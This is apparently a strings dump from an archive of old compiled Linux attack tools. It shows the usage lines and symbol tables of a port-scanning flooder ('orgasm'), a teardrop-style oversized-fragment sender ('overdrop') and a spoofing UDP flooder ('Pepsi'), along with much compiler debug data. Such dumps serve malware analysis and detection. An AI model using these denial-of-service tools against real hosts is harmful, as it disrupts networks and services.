            "exit@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "htons@@GLIBC_2.0",
            "_IO_stdin_used",
            "srandom@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/orgasm",
            "0100755",
            "0000000",
            "0000000",
            "00000033733",
            "07100656651",
            "013365",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "stdout",
            "connect",
            "memcpy",
            "perror",
            "system",
            "socket",
            "fflush",
            "__deregister_frame_info",
            "fork",
            "srand",
            "time",
            "gethostbyname",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRht",
            "QVhD",
            "]U$`",
            "PPPEPm",
            "1fEP",
            "UPEP",
            "u0EPh.",
            "EP]U(E",
            "t$EP",
            "\u0403;u[]",
            "1.0 pre",
            "orgasm.c by napster %s...",
            "usage: %s <address> <portlow> <porthigh> <# connex>",
            "clear",
            "                         orgasm.c by napster %s",
            "                                 [1.28.97]",
            "Target address: %s",
            "Port scanning target...",
            "Ports open:",
            "Port info complete, flooding ports.",
            "%d hit",
            "resolving",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "orgasm.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fork@@GLIBC_2.0",
            "fflush@@GLIBC_2.0",
            "resolve",
            "system@@GLIBC_2.0",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "stdout@@GLIBC_2.0",
            "pscan",
            "time@@GLIBC_2.0",
            "_start",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "srand@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "reseed",
            "datapool/bin/overdrop",
            "0100755",
            "0000000",
            "0000000",
            "00000036150",
            "07100656653",
            "013733",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "memcpy",
            "perror",
            "malloc",
            "optarg",
            "socket",
            "bzero",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "setsockopt",
            "rand",
            "sendto",
            "bcopy",
            "getopt",
            "inet_ntoa",
            "time",
            "gethostbyname",
            "stderr",
            "srandom",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "free",
            "GLIBC_2.0",
            "1^PTRh4",
            "QVhx",
            "Uu=E",
            "1-EP",
            "REPEP",
            "]U4SE",
            "fEfUE",
            "fEfEE",
            "EEEj8EP",
            "EPEPj",
            "EPE@P",
            "1fEP",
            "1fEP",
            "j8EPE",
            "P u1h",
            "P^ u0h",
            "EP }",
            "u&h ",
            "u#h`",
            ".EEEP",
            "EEEP}",
            "EPh\u0110",
            "E;E|",
            "u721fR%1fREP",
            "PEP 11fR1fREPEPEPe h\u0490",
            "Egh\u0610",
            "\u0403;u[]",
            "%s dst_ip [ -n how_many ] [ -s src_ip ]",
            "sendto",
            "overdrop by lcamtuf [based on teardrop by route|daemon9]",
            "raw socket",
            "IP_HDRINCL",
            "Can't resolve destination address.",
            "s:n:",
            "Can't resolve source address.",
            "Sending oversized packets:",
            "From: ",
            "       (random)",
            "%15s",
            "  To: %15s",
            " Amt: %5d",
            "b00z ",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "overdrop.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "inet_ntoa@@GLIBC_2.0",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "name_resolve",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "time@@GLIBC_2.0",
            "_start",
            "getopt@@GLIBC_2.0",
            "send_frags",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "htons@@GLIBC_2.0",
            "optarg@@GLIBC_2.0",
            "_IO_stdin_used",
            "srandom@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "rand@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/pepsi",
            "0100755",
            "0000000",
            "0000000",
            "00000040677",
            "07100657316",
            "013221",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "strcpy",
            "printf",
            "memcpy",
            "perror",
            "puts",
            "malloc",
            "optarg",
            "socket",
            "inet_addr",
            "__deregister_frame_info",
            "optind",
            "wait",
            "rand",
            "sendto",
            "getopt",
            "memset",
            "gethostbyname",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRhd",
            "E1fE",
            "fE1fu",
            "e[^]U",
            "]U(E",
            "1fRM",
            "PEPEP; u-h6",
            "\u0403;u[]",
            "Pepsi.c v1.6",
            "\t\t\t%s Author - Soldier  ",
            "\t\t\t         [10.27.96]    ",
            "My christmas present to the internet -Soldier",
            "This Copy Registered to: %s",
            "usage:",
            "%s [-s src] [-n num] [-p size] [-d port] [-o port] [-w wait] <dest>",
            "\t-s <src>    : source where packets are comming from",
            "\t-n <num>    : number of UDP packets to send",
            "\t-p <size>   : Packet Size               [Default is 1024]",
            "\t-d <port>   : Destination Port          [Default is  %.2d]",
            "\t-o <port>   : Source Port               [Default is  %.2d]",
            "\t-w <time>   : Wait time between packets [Default is    1]",
            "\t<dest>      : destination ",
            "[*] Unable to resolve %s\t",
            "[*] Unable To resolve %s\t",
            "s:d:n:p:w:o:",
            "[*] Specify a target host, doof!",
            "[*] Agh!  Out of memory!",
            "malloc",
            "# Target Host          : %s",
            "Random",
            "# Source Host          : %s",
            "# Number               : Unliminted",
            "# Number               : %d",
            "# Packet Size          : %d",
            "# Wait Time            : %d",
            "# Dest Port            : %d",
            "# Source Port          : %d",
            "[*] Error sending Packet",
            "SendPacket",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
